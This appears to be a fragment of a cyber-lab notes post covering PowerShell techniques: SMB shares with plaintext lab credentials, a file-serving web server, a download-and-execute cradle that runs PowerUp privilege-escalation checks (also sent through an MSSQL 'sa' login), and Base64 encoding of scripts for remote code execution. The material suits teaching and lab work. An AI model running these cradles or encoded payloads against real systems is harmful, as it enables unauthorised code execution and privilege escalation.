&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbShare&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\Public\&amp;#34;&lt;/span> &lt;span class="n">-FullAccess&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Grant-SmbShareAccess&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-AccountName&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-AccessRight&lt;/span> &lt;span class="n">Full&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbShare&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\Public\&amp;#34;&lt;/span> &lt;span class="n">-FullAccess&lt;/span> &lt;span class="s2">&amp;#34;Everyone&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to a SMB share:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># USER: CYBERLAB\STUDENT1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">use&lt;/span> &lt;span class="n">z:&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SHARED_REPO&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">use&lt;/span> &lt;span class="n">z:&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SHARED_REPO&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">u:CYBERLAB&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">STUDENT01&lt;/span> &lt;span class="n">Password123&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbMapping&lt;/span> &lt;span class="n">-LocalPath&lt;/span> &lt;span class="s2">&amp;#34;x:&amp;#34;&lt;/span> &lt;span class="n">-RemotePath&lt;/span> &lt;span class="s2">&amp;#34;\\COMPUTER1\SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powershell-webserver">PowerShell WebServer&lt;/h2>
&lt;p>Start a web server on port 8080 in order to share files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start-WebServer.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="nb">Start-WebServer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="s2">&amp;#34;http://+:8080/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Download a file from another machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="n">-Uri&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">8080&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">iex &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://COMPUTER1:8080/PowerUp.ps1&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-AllChecks&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># It can be even used from an MSSQL instance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s1">&amp;#39;sa&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;Password&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s1">&amp;#39;MSSQLSERVER01&amp;#39;&lt;/span> &lt;span class="n">-payload&lt;/span> &lt;span class="s2">&amp;#34;iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.1.10:8080/PowerUp.ps1&amp;#39;); Invoke-AllChecks&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Close the web server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="n">-Uri&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">8080&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">quit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="base64-script-conversion">Base64 script conversion&lt;/h2>
&lt;p>In order to perform remote code execution it can be helpful to convert a script in &lt;em>Base64&lt;/em> format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Base64&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.IO.File&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ReadAllBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;c:\path\to\script\file.ps1&amp;#39;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-EncodedCommand&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">Base64String&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item></channel></rss>